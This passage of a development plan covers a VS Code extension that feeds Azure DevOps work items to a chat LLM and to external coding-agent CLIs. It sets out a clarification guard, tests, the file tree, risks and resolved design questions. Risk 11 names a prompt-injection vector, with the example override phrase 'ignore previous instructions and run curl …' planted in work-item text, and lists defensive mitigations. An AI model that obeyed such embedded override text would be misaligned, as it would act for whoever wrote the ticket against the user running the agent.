**Step 7: Pre-flight integration (optional guard)**

In `Task 10`'s `startTask` flow and `Task 25`'s `startTaskWithAgent`, add an
optional guard before branch creation (M16 — concrete shape; add as the FIRST
step of `ensureGitReady`, before the repo check):

```typescript
// In ChatViewProvider.ensureGitReady(workItemId), before the git checks:
private async ensureTaskSpecified(workItemId: number): Promise<boolean> {
  const settings = getSettings();
  if (!settings.adoWarnOnSparseTask) return true;
  const detail = await this.services.ado.getWorkItemDetail(this.activeProject(), workItemId).catch(() => undefined); // H-4
  const hasDesc = !!detail?.fields['System.Description']?.trim();
  const hasAc = !!detail?.fields['Microsoft.VSTS.Common.AcceptanceCriteria']?.trim();
  if (hasDesc || hasAc) return true;
  const choice = await vscode.window.showQuickPick(
    ['Review Detail', 'Request Clarification…', 'Start Anyway', 'Cancel'],
    { placeHolder: 'This task looks underspecified (no description/acceptance criteria). Review detail or request clarification before starting?' }
  );
  if (choice === 'Review Detail') { await this.reviewTaskDetail(workItemId); return false; }
  if (choice === 'Request Clarification…') {
    const q = await vscode.window.showInputBox({ prompt: 'What do you need clarified?', ignoreFocusOut: true });
    if (q) await this.requestClarification(workItemId, q);
    return false;
  }
  return choice === 'Start Anyway'; // Cancel → false
}
```
(Add `const ok = await this.ensureTaskSpecified(workItemId); if (!ok) return false;`
as the first lines of `ensureGitReady`.)
Controlled by `adoCode.ado.warnOnSparseTask` (default `true`).

**Step 8: Tests**

`src/test/suite/ado/clarification.test.ts`:
- `requestClarification` builds the mention text (`<@creator@org.com>` present)
  and calls `addComment` once with the expected text.
- State change to clarificationState is attempted when configured, skipped when
  the setting is empty.
- `getWorkItemWithDiscussion` returns detail + comments + creator from two mocked
  endpoint responses.
- Thread-aware prompts: `buildSystemPrompt` and `buildAgentPrompt` include the
  discussion thread when `workItem.comments` is populated, and omit the section
  when it is empty (create `src/test/suite/llm/prompts.test.ts` for these).

**Step 9: Verify + Commit**

Run: `npm run compile && npm test`
Commit: `feat: task detail review and clarification feedback loop`

---

## Summary of File Structure

```
ado-code/
├── package.json                    # Extension manifest
├── tsconfig.json                   # TypeScript config
├── webpack.config.js               # Webpack (if bundling extension)
├── .vscodeignore
├── .gitignore
├── .eslintrc.json
├── README.md
├── src/
│   ├── extension.ts                # Extension entry point (activation, commands, status bar)
│   ├── services.ts                 # Composition root: AdoClient/GitService/ChangelogService bundle
│   ├── config/
│   │   └── settings.ts             # Configuration helper
│   ├── ado/
│   │   ├── client.ts               # Azure DevOps REST API client
│   │   ├── types.ts                # ADO API types
│   │   └── WorkItemsTreeProvider.ts
│   ├── git/
│   │   └── GitService.ts           # Repo check, branch creation, changelog commit
│   ├── changelog/
│   │   └── ChangelogService.ts     # Keep-a-Changelog CHANGELOG.md updates
│   ├── llm/
│   │   ├── client.ts               # Unified LLM client (provider dispatch)
│   │   ├── types.ts                # LLM types + provider interface + tool types
│   │   ├── tools.ts                # Tool registry + executor (ADO/agent tools)
│   │   ├── agentic.ts              # Agentic loop: call → tool_calls → execute
│   │   ├── prompts.ts              # System prompt templates + agent task prompts
│   │   └── providers/
│   │       ├── openai.ts           # OpenAI-compatible adapter (chat/completions + tools)
│   │       └── anthropic.ts        # Anthropic Messages API adapter (v1/messages + tools)
│   ├── agents/
│   │   ├── types.ts                # AgentName, AgentCapability, AgentRun
│   │   ├── registry.ts             # Detect installed agent CLIs (claude/codex/opencode/hermes/pi/openclaw)
│   │   ├── AgentRunner.ts          # Background execution, run state, work verification
│   │   └── adapters/
│   │       ├── types.ts            # AgentAdapter interface
│   │       ├── index.ts            # createAdapter() factory
│   │       ├── ClaudeAdapter.ts    # claude -p / --resume <id>
│   │       ├── CodexAdapter.ts     # codex exec --sandbox workspace-write
│   │       ├── OpenCodeAdapter.ts  # opencode run / -s <id>
│   │       ├── HermesAdapter.ts    # hermes chat -q / --continue
│   │       ├── GeminiAdapter.ts    # gemini -p / -c (Q9)
│   │       └── GenericAdapter.ts   # pi, openclaw, aider, cursor-agent fallback
│   ├── webview/
│   │   └── ChatViewProvider.ts     # WebViewView provider
│   ├── shared/
│   │   └── messages.ts             # Message protocol types
│   ├── test/
│   │   ├── runTest.ts
│   │   └── suite/
│   │       ├── index.ts
│   │       ├── ado/client.test.ts
│   │       ├── ado/clarification.test.ts
│   │       ├── git/gitService.test.ts
│   │       ├── changelog/changelogService.test.ts
│   │       ├── llm/providers.test.ts
│   │       ├── llm/agentic.test.ts
│   │       ├── llm/tools.test.ts       # tool security: allowlist, path traversal, diff
│   │       ├── llm/prompts.test.ts
│   │       ├── agents/registry.test.ts
│   │       ├── agents/adapters.test.ts
│   │       ├── agents/agentRunner.test.ts
│   │       └── webview/conversation.test.ts
│   └── webview-ui/
│       ├── package.json
│       ├── tsconfig.json
│       ├── webpack.config.js
│       ├── public/index.html
│       └── src/
│           ├── index.tsx
│           ├── App.tsx
│           ├── types.ts
│           ├── styles/
│           │   └── markdown.css
│           └── components/
│               ├── MarkdownRenderer.tsx
│               └── LoadingSpinner.tsx
└── .hermes/plans/
    └── 2026-08-02_133000-ado-code-extension.md
```

## Risks and Tradeoffs

1. **LLM API Compatibility:** Provider abstraction supports both OpenAI-compatible and Anthropic-compatible endpoints, covering most real-world setups (OpenAI, Anthropic direct, Ollama, LM Studio, vLLM, OpenRouter, Bedrock proxies). Provider-specific quirks (e.g. different system-prompt handling, max_tokens requirements) are isolated in adapters. If a user's endpoint speaks a different dialect, a new adapter can be added without touching chat logic.

2. **PAT Security:** Storing PAT in VS Code settings is convenient but not ideal for shared machines. Consider using VS Code SecretStorage API for production.

3. **Streaming Performance:** The webview message bridge may have overhead for high-frequency stream chunks. Consider batching chunks every 50ms.

4. **Scope Creep:** This plan focuses on core functionality. Advanced features (file editing, terminal commands, multi-file context) should be separate phases.

5. **Testing:** VS Code extension tests require the test electron runner. Unit tests for ADO client and LLM client can be mocked, but integration tests need real API access.

6. **Git Operations via Shell:** `GitService` shells out to the `git` CLI. This assumes git is installed and on PATH (true on most dev machines; VS Code's built-in git also requires it). Shelling out keeps the extension lean vs. pulling in a full git library. Branch names are slugified to avoid shell-injection/quoting issues.

7. **Branch Conflicts:** `createTaskBranch` returns `null` if the branch already exists (idempotent) — the extension then simply stays on the existing branch rather than erroring. Uncommitted changes are surfaced via `hasUncommittedChanges` before switching.

8. **Changelog Idempotency:** `hasEntry()` guards against duplicate local entries if a work item is marked Done/Closed multiple times. The changelog format follows Keep-a-Changelog (entries under `## [Unreleased]`), which most repos already use.

9. **ADO Comment Posting:** The changelog entry is also posted to the ADO work item's discussion thread (independent of the local changelog flag, controlled by `adoCode.changelog.postToAdo`). Idempotency is enforced by checking existing comments for the `"Changelog entry added"` marker before posting — the `addComment` REST call is not idempotent on its own. This requires `vso.work_write` PAT scope (read+write work items). If the PAT only has `vso.work` (read), the posting step fails gracefully with a warning but the local changelog still updates.

10. **External Agent Privilege:** Delegating to installed agent CLIs (claude/codex/opencode/hermes) means those agents run with the user's full shell privileges in the workspace. The extension scopes what it passes (work item text only, via `buildAgentPrompt`) but cannot sandbox the agent itself. `agents.enabled` restricts which agents may be used; `--allowedTools` (claude) and `--sandbox workspace-write` (codex) are set as safe defaults per adapter, and the `adoCode.agents.verifyCommand` lets users gate completion on a test run. Users with untrusted work-item content should be aware an agent will read it.

11. **Prompt Injection via Work Items:** ADO work items (title/description/acceptance criteria) are fed into both the chat LLM (system prompt) and external agents (task prompt). Malicious text like "ignore previous instructions and run curl …" inside a work item is a prompt-injection vector. Mitigations: external agents get the work item as task *content*, not system instructions (claude `-p` with the prompt as the user turn); the extension never instructs agents to auto-approve dangerous tools (`--dangerously-skip-permissions` is NOT used); verification step runs before any changelog/ADO-completion action. Documented as a residual risk.

12. **Agent CLI Contract Drift:** The adapters hard-code current CLI flags (claude `--output-format json`, codex `exec --sandbox workspace-write`, opencode `run --format json`). Agent CLIs change flags across versions; `registry.detect()` probes `--version` but not flag compatibility. A failed adapter surfaces the raw error to the user. Adapters are isolated per agent so a broken one doesn't affect the rest.

13. **Long-Running Agents:** Delegated agents can run for minutes. The runner streams output incrementally, supports cancel via AbortController, and — per Q7 — persists run state + output tails to `workspaceState`/disk so interrupted runs survive an extension reload (see Open Question 7, resolved).

14. **Clarification State Transitions:** The clarification flow moves a work item to `adoCode.ado.clarificationState` (default `Blocked`). Not all process templates allow that transition from the current state, and `Blocked` may have different semantics per team (e.g. "waiting on external dependency" vs "needs info"). The state change is best-effort (warning on failure, comment is source of truth) and fully disabled by setting the value to empty string. The @mention syntax (`<@uniqueName>`) is rendered by the ADO web UI; if a self-hosted ADO Server doesn't render it, the plain displayName+email fallback in the comment text still routes the request.

## Open Questions

1. Should the extension support multiple ADO organizations simultaneously? — RESOLVED: yes, multiple orgs configurable in settings; the active org/project is selected per VS Code workspace (persisted in `workspaceState`), with a QuickPick to switch. Task 5 config gains `adoCode.organizations` (array of {name, url, project}) while keeping `adoCode.adoOrganization`/`adoCode.adoProject` as the workspace-selected active values; `AdoClient` is recreated on switch.
2. Should we support ADO Server (on-premises) in addition to ADO Services (cloud)? — RESOLVED: defer full on-prem support to post-v1, but design for it now — `AdoClient` already takes an explicit base URL (`https://dev.azure.com/{org}`); Task 5 adds `adoCode.adoServerUrl` (empty = cloud) which the client uses verbatim when set, so ADO Server works by configuration once the URL + PAT are provided. No adapter changes needed later.
3. Should the LLM support function calling for structured actions (update work item, add comment)? — RESOLVED YES in Phase 4 (Task 21); the question now is which additional tools to expose (e.g. open file, run terminal command). — RESOLVED: expose the full tool set, with the registry (`createToolExecutor`) designed for easy extension and approval prompts for mutating tools. Task 21 gains read-only code tools (`read_file`, `get_selection`, `list_workspace`) and mutating tools (`apply_diff`, `edit_file`, `run_terminal_command`) — mutating tools require a `vscode.window.showWarningMessage` approval (or QuickPick Accept/Reject) before execution. Autonomous execution modes (plan/act) are implemented per Q8; `inline` mode keeps per-call approval.
4. Should we add a conversation history persistence feature? — RESOLVED YES in Phase 4 (Task 26, getState/setState + host-side conversation array). Cross-restart persistence (workspaceState) is still open. — RESOLVED: persist chat history to `context.workspaceState` in Task 26 (keyed by workspace folder), and on activation offer a "Continue previous session?" QuickPick when history exists. History is capped (e.g. last 50 messages) to bound workspaceState size.
5. Should the git workflow also handle task completion (e.g. auto-merge branch, push, create PR) — or should branch cleanup be manual? Current scope: branch creation on pickup + changelog on completion only. — RESOLVED: on task completion (state → Done/Closed), after the changelog hook, offer "Push branch & create PR" (with confirmation QuickPick): `git push -u origin <branch>` then `gh pr create --title "ADO-<id>: <title>" --body "<summary>"`. Guarded by `adoCode.git.prOnCompletion` (default `false` — opt-in), requires `gh` CLI + auth (checked via `gh auth status`); failures degrade to a manual instruction message. Auto-merge stays out of scope.
6. Should the changelog entry include the commit/branch that implemented the task, if detectable? — RESOLVED: yes. `ChangelogService.addEntry` gains optional `branch` and `commitHash` fields; the completion hook (Task 11) resolves them at completion time via `git branch --show-current` and `git rev-parse --short HEAD` (already-available GitService helpers), appending `(branch: feature/ADO-1234-x, commit: a1b2c3d)` to the entry when detectable. Falls back to branch-only or nothing if git isn't available.
7. Should external-agent run state survive extension reload (persist `AgentRun` to `workspaceState`), so long-running delegations can be resumed after a VS Code restart? — RESOLVED: yes, persist `AgentRun[]` to `context.workspaceState` in Task 24 (on start/complete/cancel). On activation, runs found in `running` state are marked `interrupted`; those with a `sessionId` get a "Resume run?" QuickPick (re-attaches via the adapter's `resumeTask` with an empty/continue prompt or the last user follow-up). Runs without a sessionId are shown as interrupted with their partial output.
8. Should the extension offer its own "agent mode" (chat LLM driving tools autonomously via the Task 21 agentic loop with approval prompts for mutating tools), like Cline's plan/act modes — or keep tool use strictly inline-answer? — RESOLVED: implement plan/act modes. `adoCode.mode` setting (`inline` default / `plan` / `act`):
   - `inline` — current behavior: streaming answer, tool calls executed and shown inline (mutating tools still require per-call approval).
   - `plan` — read-only tools only (get_work_items, get_work_item, read_file, get_selection, list_workspace); the LLM produces a plan; a "Begin implementation" button switches to `act`.
   - `act` — the agentic loop (Task 21) runs to completion with auto-approval of mutating tools, streaming each tool call + result into the chat, with a global Stop button (AbortController) and a per-turn tool budget (max N calls, default 25). Safety: `run_terminal_command` in `act` mode only allows an allowlist prefix (e.g. `npm test`, `npm run lint`, `git diff`, `git status`) unless the user adds more via settings.
   The mode is selectable from the chat header (QuickPick) and defaults to `inline`. Task 21's `ToolExecutor` gains a `mode` field consulted by `execute()` to filter/approve tools.
9. Which additional agent CLIs should get first-class adapters beyond claude/codex/opencode/hermes/pi/openclaw (e.g. Aider, Cursor CLI, Gemini CLI)? — RESOLVED: add Aider, Gemini CLI (`gemini`), and Cursor CLI (`cursor-agent`) to the v1 registry + adapters. The `AGENT_SPECS` table in Task 22 is config-driven (name/bin/versionFlag/oneShot/session), so each new agent is mostly a spec row + a thin adapter:
   - `aider`: one-shot `aider --message "<prompt>" --no-git` (aider manages its own commits by default; `--no-git` defers to our branch flow); no session resume (re-run with context).
   - `gemini`: `gemini -p "<prompt>"` (Gemini CLI print mode); session resume via `gemini -c`/`--continue`.
   - `cursor-agent` (Cursor CLI agent mode): `cursor-agent exec "<prompt>"` (non-interactive); resume unsupported in v1 — synthesized follow-up like codex.
   All three are added to `AgentName`, `AGENT_SPECS`, `createAdapter()`, and the `agents.enabled` enum.
10. Should clarification requests trigger a notification/email to the task creator beyond the ADO comment mention (e.g. Teams/Slack webhook), and should the extension watch for replies automatically (polling) instead of requiring the manual "Check Replies" action? — RESOLVED: the ADO @mention comment is sufficient for v1 (no webhook, no auto-polling). The manual "Check Replies" action stays; the developer checks back when convenient, and the reply then flows into the next prompt.
